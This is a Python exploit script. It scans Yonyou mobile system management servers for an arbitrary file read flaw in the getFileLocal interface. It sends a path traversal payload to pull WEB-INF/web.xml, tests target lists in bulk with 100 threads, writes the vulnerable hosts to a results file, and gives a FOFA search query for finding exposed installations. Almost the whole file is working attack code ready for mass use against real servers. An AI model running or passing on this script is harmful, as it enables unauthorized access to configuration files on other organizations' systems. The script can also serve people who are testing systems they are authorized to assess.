import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """用友移动系统管理getFileLocal接口存在任意文件读取"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友移动系统管理getFileLocal接口存在任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml"
    headers = {
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding":"gzip,deflate,br",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"JSESSIONID=B9F1AC8D34E9DFD16A3A7A4B9CEE4EF9.server",
        "Connection":"close",
    }
    try:
        response = requests.post(url=target + payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'LoggerFilter' in response.text:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('用友移动_result.txt', 'a') as f:
                f.write(f"{target}存在任意文件读取漏洞\n")
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except:
        print(f"{target}可能存在任意文件读取漏洞")
if __name__ == '__main__':
    main()

# fofa语句
# app="用友-移动系统管理"